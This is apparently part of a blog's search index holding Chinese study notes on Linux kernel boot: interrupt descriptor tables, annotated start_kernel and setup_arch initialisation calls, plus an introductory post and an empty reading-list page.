<p>中断是由硬件或者软件发出的事件，CPU 接收事件后会将控制流转到 <strong>中断处理程序</strong>中，一般中断分成三类：</p>
<ul>
<li>硬件中断：硬件有任何事件发生时</li>
<li>软件中断：软件需要内核提供功能时，一般是系统调用</li>
<li>异常：CPU 检测到错误时，如除零错误或者不存在的内存页</li>
</ul>
<p>通常使用数字表示异常和中断类型，称之为<strong>向量号</strong>，一般来说前32位表示异常，其余表示用户自定义的中断</p>
<p>中断数据处理的结构类似于全局描述符表 GDT，也存在中断描述符表<code>IDT</code>，中断描述符表寄存器 <code>idtr</code>，以及加载基地址的操作指令 <code>lidt</code></p>
<p>即如果触发中断，则将会从从 <code>idr</code> 中找到 <code>IDT</code> 的基址，随后通过向量号搜索描述符的起始地址，额外的，一般将IDT中的每一项称之为 <code>gate</code> 即门</p>
<p>64位下 gate 的结构是</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">127                                                                             96</span><br><span class="line"> --------------------------------------------------------------------------------</span><br><span class="line">|                                                                               |</span><br><span class="line">|                                Reserved                                       |</span><br><span class="line">|                                                                               |</span><br><span class="line"> --------------------------------------------------------------------------------</span><br><span class="line">95                                                                              64</span><br><span class="line"> --------------------------------------------------------------------------------</span><br><span class="line">|                                                                               |</span><br><span class="line">|                               Offset 63..32                                   |</span><br><span class="line">|                                                                               |</span><br><span class="line"> --------------------------------------------------------------------------------</span><br><span class="line">63                               48 47      46  44   42    39             34    32</span><br><span class="line"> --------------------------------------------------------------------------------</span><br><span class="line">|                                  |       |  D  |   |     |      |   |   |     |</span><br><span class="line">|       Offset 31..16              |   P   |  P  | 0 |Type |0 0 0 | 0 | 0 | IST |</span><br><span class="line">|                                  |       |  L  |   |     |      |   |   |     |</span><br><span class="line"> --------------------------------------------------------------------------------</span><br><span class="line">31                                   15 16                                      0</span><br><span class="line"> --------------------------------------------------------------------------------</span><br><span class="line">|                                      |                                        |</span><br><span class="line">|          Segment Selector            |                 Offset 15..0           |</span><br><span class="line">|                                      |                                        |</span><br><span class="line"> --------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
<p><strong>rest of prepare</strong></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// 获取实模式 boot_params，两项工作</span><br><span class="line">// 复制内容 与 获取命令行</span><br><span class="line">copy_bootdata(__va(real_mode_data));</span><br><span class="line"></span><br><span class="line">// 加载处理器微代码</span><br><span class="line">load_ucode_bsp();</span><br><span class="line"></span><br><span class="line">// 将 init_top_pgt 最后一项设置为内核高地址映射</span><br><span class="line">init_top_pgt[511] = early_top_pgt[511];</span><br></pre></td></tr></table></figure>

<h2 id="Start-kernel"><a href="#Start-kernel" class="headerlink" title="Start_kernel"></a>Start_kernel</h2><p>此函数的主要目的是完成内核初始化并启动 1 号进程</p>
<h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>源码入口：<code>init/main.c</code></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// 设置 canary 以检测栈溢出</span><br><span class="line">set_task_stack_end_magic(&amp;init_task);</span><br><span class="line"></span><br><span class="line">// 初始化控制组信息以及所有需要 early init 的子系统</span><br><span class="line">cgroup_init_early();</span><br><span class="line"></span><br><span class="line">// 激活第一个CPU，并设置状态</span><br><span class="line">boot_cpu_init();</span><br><span class="line"></span><br><span class="line">// 初始化页地址</span><br><span class="line">page_address_init();</span><br><span class="line"></span><br><span class="line">// 打印 内核版本信息</span><br><span class="line">// 🌰 Linux version 4.15.8 (simple@vps-simple) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-16) (GCC)) #19 SMP Mon Mar 19 18:50:28 CST 2018</span><br><span class="line">pr_notice(&quot;%s&quot;, linux_banner);</span><br><span class="line"></span><br><span class="line">// 依赖于体系结构的初始化</span><br><span class="line">setup_arch(&amp;command_line);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>体系架构初始化</strong><br>源码入口：<code>/arch/x86/kernel/setup.c</code></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// 打印命令行</span><br><span class="line">// 🌰 Command line: root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr</span><br><span class="line">printk(KERN_INFO &quot;Command line: %s\n&quot;, boot_command_line);</span><br><span class="line"></span><br><span class="line">// 检测系统是否支持 OLPC</span><br><span class="line">olpc_ofw_detect();</span><br><span class="line"></span><br><span class="line">// 初始化调试功能</span><br><span class="line">idt_setup_early_traps();</span><br></pre></td></tr></table></figure>
<p>当中断发生后，栈内的格式是：</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">    +-----------------------+</span><br><span class="line">    |                       |</span><br><span class="line">+40 |         SS            |</span><br><span class="line">+32 |         RSP           |</span><br><span class="line">+24 |        RFLAGS         |</span><br><span class="line">+16 |         CS            |</span><br><span class="line">+8  |         RIP           |</span><br><span class="line"> 0  |       Error Code      | &lt;---- rsp</span><br><span class="line">    |                       |</span><br><span class="line">    +-----------------------+</span><br></pre></td></tr></table></figure>

<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// 搜集 CPU 及供应商信息</span><br><span class="line">early_cpu_init();</span><br><span class="line"></span><br><span class="line">// 初始化早期 ioremap</span><br><span class="line">early_ioremap_init();</span><br></pre></td></tr></table></figure>
<p>一般与设备实现通信有两种方式：</p>
<ul>
<li>I&#x2F;O 端口：通过 outb&#x2F;inb 指令实现</li>
<li>设备内存：将设备内存映射到内核地址空间，即当 CPU 读取物理内存时，能够读取到 I&#x2F;O 设备的物理 RAW 区域</li>
</ul>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// 获取根设备的主次设备号</span><br><span class="line">// 主设备号识别驱动，次设备号表示设备</span><br><span class="line">ROOT_DEV = old_decode_dev(boot_params.hdr.root_dev);</span><br><span class="line"></span><br><span class="line">// 设置显示参数</span><br><span class="line">screen_info = boot_params.screen_info;</span><br><span class="line">edid_info = boot_params.edid_info;</span><br><span class="line">saved_video_mode = boot_params.hdr.vid_mode;</span><br><span class="line">bootloader_type = boot_params.hdr.type_of_loader;</span><br><span class="line">if ((bootloader_type &gt;&gt; 4) == 0xe) &#123;</span><br><span class="line">    bootloader_type &amp;= 0xf;</span><br><span class="line">    bootloader_type |= (boot_params.hdr.ext_loader_type+0x10) &lt;&lt; 4;</span><br><span class="line">&#125;</span><br><span class="line">bootloader_version  = bootloader_type &amp; 0xf;</span><br><span class="line">bootloader_version |= boot_params.hdr.ext_loader_ver &lt;&lt; 4;</span><br><span class="line"></span><br><span class="line">// 内存保留</span><br><span class="line">early_reserve_memory();</span><br><span class="line"></span><br><span class="line">// 内存映射，打印信息</span><br><span class="line">//  🌰  0.000000] e820: BIOS-provided physical RAM map:</span><br><span class="line">// [    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable</span><br><span class="line">e820__memory_setup();</span><br><span class="line"></span><br><span class="line">// 复制 BIOS 磁盘设备信息</span><br><span class="line">copy_edd();</span><br><span class="line"></span><br><span class="line">// 内存描述符初始化 及 代码/数据/BSS 资源初始化</span><br><span class="line">setup_initial_init_mm(_text, _etext, _edata, (void *)_brk_end);</span><br><span class="line">code_resource.start = __pa_symbol(_text);</span><br><span class="line">code_resource.end = __pa_symbol(_etext)-1;</span><br><span class="line">rodata_resource.start = __pa_symbol(__start_rodata);</span><br><span class="line">rodata_resource.end = __pa_symbol(__end_rodata)-1;</span><br><span class="line">data_resource.start = __pa_symbol(_sdata);</span><br><span class="line">data_resource.end = __pa_symbol(_edata)-1;</span><br><span class="line">bss_resource.start = __pa_symbol(__bss_start);</span><br><span class="line">bss_resource.end = __pa_symbol(__bss_stop)-1;</span><br><span class="line"></span><br><span class="line">// 配置 NX</span><br><span class="line">x86_configure_nx();</span><br><span class="line"></span><br><span class="line">// 解析命令行并基于创建不同的服务，如 </span><br><span class="line">parse_early_param();</span><br><span class="line"></span><br><span class="line">//内存解析</span><br><span class="line">/* update the e820_saved too */</span><br><span class="line">e820_reserve_setup_data();</span><br><span class="line">finish_e820_parsing();</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">e820_add_kernel_range();</span><br><span class="line">trim_bios_range(void);</span><br><span class="line">max_pfn = e820_end_of_ram_pfn();</span><br><span class="line">early_reserve_e820_mpc_new();</span><br><span class="line"></span><br><span class="line">//DMI扫描，通过 Desktop Management Interface 获取信息</span><br><span class="line">dmi_setup();</span><br><span class="line"></span><br><span class="line">// 解析 SMP 配置</span><br><span class="line">find_smp_config();</span><br><span class="line"></span><br><span class="line">// 额外的早期内存初始化，主要用来分配页表缓冲区，放置在 brk 区域内</span><br><span class="line">early_alloc_pgt_buf();</span><br><span class="line"></span><br><span class="line">// 分配日志缓冲区</span><br><span class="line">setup_log_buf(1);</span><br><span class="line"></span><br><span class="line">// 为 DMA 分配区域</span><br><span class="line">dma_contiguous_reserve(max_pfn_mapped &lt;&lt; PAGE_SHIFT);</span><br><span class="line"></span><br><span class="line">// 初始化 sparse memory，用于 NUMA 系统将内存区域划分为不同的内存库</span><br><span class="line">x86_init.paging.pagetable_init();</span><br><span class="line"></span><br><span class="line">// 映射 vsyscall，为 vsyscall 映射内存空间，提供对于某些系统调用的快速访问</span><br><span class="line">map_vsyscall();</span><br><span class="line"></span><br><span class="line">// 获取 SMP 配置信息</span><br><span class="line">get_smp_config();</span><br></pre></td></tr></table></figure>
<p>回归 <code>main.c</code></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// 解析命令行</span><br><span class="line">setup_command_line(command_line);</span><br><span class="line"></span><br><span class="line">// 获取可用CPU数量</span><br><span class="line">// 🌰 setup_percpu: NR_CPUS:64 nr_cpumask_bits:64 nr_cpu_ids:1 nr_node_ids:1</span><br><span class="line">setup_nr_cpu_ids();</span><br><span class="line"></span><br><span class="line">// 为 percpu 设置内存区域</span><br><span class="line">setup_per_cpu_areas();</span><br><span class="line"></span><br><span class="line">// 准备 smp Boot cpu</span><br><span class="line">smp_prepare_boot_cpu();</span><br><span class="line"></span><br><span class="line">// 建立区域列表</span><br><span class="line">build_all_zonelists(NULL);</span><br><span class="line"></span><br><span class="line">// 虚拟文件系统早起初始化</span><br><span class="line">vfs_caches_init_early();</span><br><span class="line"></span><br><span class="line">// 内存管理器初始化</span><br><span class="line">mm_init();</span><br><span class="line"></span><br><span class="line">// 调度程序初始化</span><br><span class="line">sched_init();</span><br><span class="line"></span><br><span class="line">// 初始化基础树</span><br><span class="line">radix_tree_init();</span><br><span class="line"></span><br><span class="line">// RCU 初始化</span><br><span class="line">rcu_init();</span><br><span class="line"></span><br><span class="line">// 初始化跟踪子系统</span><br><span class="line">trace_init();</span><br><span class="line"></span><br><span class="line">// 初始化 中断处理子系统</span><br><span class="line">early_irq_init();</span><br><span class="line">init_IRQ();</span><br><span class="line">softirq_init();</span><br><span class="line"></span><br><span class="line">// 初始化时间子系统</span><br><span class="line">init_timers();</span><br><span class="line">hrtimers_init();</span><br><span class="line">timekeeping_init();</span><br><span class="line"></span><br><span class="line">// 启用 irq</span><br><span class="line">local_irq_enable();</span><br><span class="line"></span><br><span class="line">// 初始化 slab</span><br><span class="line">kmem_cache_init_late();</span><br><span class="line"></span><br><span class="line">// 初始化 命令行</span><br><span class="line">console_init();</span><br><span class="line"></span><br><span class="line">// pid hash table 初始化</span><br><span class="line">pid_idr_init();</span><br><span class="line"></span><br><span class="line">// 初始化 线程/栈 缓存</span><br><span class="line">thread_stack_cache_init();</span><br><span class="line"></span><br><span class="line">// 初始化 cred</span><br><span class="line">cred_init();</span><br><span class="line"></span><br><span class="line">// 为 task_struct 分配缓存</span><br><span class="line">fork_init();</span><br><span class="line"></span><br><span class="line">// 为 内存描述符分配缓存</span><br><span class="line">proc_caches_init();</span><br><span class="line"></span><br><span class="line">// 为 vfs 分配缓存</span><br><span class="line">vfs_caches_init();</span><br><span class="line"></span><br><span class="line">// 为 procfs 创建根目录</span><br><span class="line">proc_root_init();</span><br><span class="line"></span><br><span class="line">// 初始化 安全内容</span><br><span class="line">key_init();</span><br><span class="line">security_init();</span><br><span class="line"></span><br><span class="line">... 子系统</span><br><span class="line"></span><br><span class="line">// 剩余初始化</span><br><span class="line">arch_call_rest_init();</span><br><span class="line">    - rest_init</span><br><span class="line">        // 启动 RCU 调度程序</span><br><span class="line">        - rcu_scheduler_starting();</span><br><span class="line">        // 构建 init 进程和 kthreadd 线程</span><br><span class="line">        - pid = kernel_thread(kernel_init, NULL, CLONE_FS);</span><br><span class="line">        - pid = kernel_thread(kthreadd, NULL, CLONE_FS | CLONE_FILES);</span><br><span class="line">        // 获取 kthreadd tast_struct</span><br><span class="line">        - kthreadd_task = find_task_by_pid_ns(pid, &amp;init_pid_ns);</span><br><span class="line"></span><br><span class="line">        - 更新系统状态</span><br><span class="line">        system_state = SYSTEM_SCHEDULING;</span><br><span class="line"></span><br><span class="line">        - 正式启动</span><br></pre></td></tr></table></figure>
<p><strong>SMP Prepare</strong><br>此函数依旧是特定于体系架构</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// 获取当前 CPU</span><br><span class="line">int me = smp_processor_id();</span><br><span class="line">// 为给定CPU重新加载 GDT</span><br><span class="line">switch_to_new_gdt(me);</span><br><span class="line"></span><br><span class="line">// 将 CPU 修改为在线</span><br><span class="line">cpumask_set_cpu(me, cpu_callout_mask);</span><br><span class="line">cpu_set_state_online(me);</span><br><span class="line">native_pv_lock_init();</span><br></pre></td></tr></table></figure>
<p><strong>建立区域列表</strong><br>此函数设置优先分配的区域顺序<br>Linux内核将物理内存分成 nodes，其结构为 pglist_data<br>每一个 node 被分成很多块，称之为 zones，结构为 zone</p>
<p>拥有以下类型：</p>
<ul>
<li>ZONE_DMA 0-16M</li>
<li>ZONE_DMA32 用于4G以下DMA区域的32位设备</li>
<li>ZONE_NORMAL 所有 4G RAM 区域 x86_64</li>
<li>ZONE_HIGHMEM x86_64 不存在</li>
<li>ZONE_MOVABLE 包含可移动页面区</li>
</ul>
<p><strong>RCU</strong><br>RCU read-copy-update，是Linux内核实现的一种可拓展的高性能同步机制，其专门为很少修改的数据结构而设计</p>
]]></content>
      <categories>
        <category>Kernel</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Kernel 挖矿之旅</title>
    <url>/2022/05/13/Linux-Kernel-%E6%8C%96%E7%9F%BF%E4%B9%8B%E6%97%85/</url>
    <content><![CDATA[<blockquote>
<p>本文学习的内核版本为 5.17.7 x86</p>
</blockquote>
<h1 id="为什么要学习-Linux-Kernel"><a href="#为什么要学习-Linux-Kernel" class="headerlink" title="为什么要学习 Linux Kernel"></a>为什么要学习 Linux Kernel</h1><p>广义而言，操作系统就是一个软件，能够管理硬件和软件资源，为软件提供更好的运行环境，为硬件提供更好的访问支持</p>
<p>如果操作系统是一个软件，那么内核其实相对于操作系统而言也是操作系统，感觉有种无限套娃的感觉，但是是可以这么说的，操作系统为软件访问硬件提供服务，内核为操作系统访问硬件提供服务，所以内核是操作系统的精华所在，通过学习内核能够对操作系统拥有更深的认识</p>
<p>举个可能不是很恰当的例子，在用户层面可以通过 malloc 函数分配内存，但是内核分配的内存与用户要求的内存是否完全一致，这个就需要考虑内核的内存管理和分配策略</p>
<p>而且内核是一群极客用极端的方式压榨资源搞出来的，它包含了几乎所有能想到的方式去进行构造，以使得达到足够的性能</p>
<p>总的来说，熟悉操作系统内核能够使得在 OS-S 路上走的更远</p>
<h1 id="Linux-Kernel-启动流程"><a href="#Linux-Kernel-启动流程" class="headerlink" title="Linux Kernel 启动流程"></a>Linux Kernel 启动流程</h1><ul>
<li><a href="Linux-Kernel-%E4%B9%8B-%E5%BC%80%E5%A4%A9%E8%BE%9F%E5%9C%B0.md">Kernel 装载到内存</a></li>
<li><a href="Linux-Kernel-%E4%B9%8B-%E9%82%A3%E4%B8%80%E6%9D%9F%E5%85%89.md">Kernel 初始化到启动</a></li>
</ul>
<hr>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li>Linux 内核揭秘</li>
</ul>
]]></content>
      <categories>
        <category>Kernel</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>awesome-recommand</title>
    <url>/2022/05/13/awesome-recommand/</url>
    <content><![CDATA[<span id="more"></span>

<h2 id="Operating-System"><a href="#Operating-System" class="headerlink" title="Operating System"></a>Operating System</h2><h3 id="Book"><a href="#Book" class="headerlink" title="Book"></a>Book</h3><h3 id="Audio-x2F-Video"><a href="#Audio-x2F-Video" class="headerlink" title="Audio&#x2F;Video"></a>Audio&#x2F;Video</h3><h3 id="Website"><a href="#Website" class="headerlink" title="Website"></a>Website</h3><h3 id="github"><a href="#github" class="headerlink" title="github"></a>github</h3><h3 id="Blog"><a href="#Blog" class="headerlink" title="Blog"></a>Blog</h3><h2 id="Linux-Kernel-Pwn"><a href="#Linux-Kernel-Pwn" class="headerlink" title="Linux Kernel Pwn"></a>Linux Kernel Pwn</h2><h2 id="Command-Line"><a href="#Command-Line" class="headerlink" title="Command Line"></a>Command Line</h2>]]></content>
      <categories>
        <category>阅读笔记</category>
      </categories>
      <tags>
        <tag>推荐</tag>
      </tags>
  </entry>
</search>
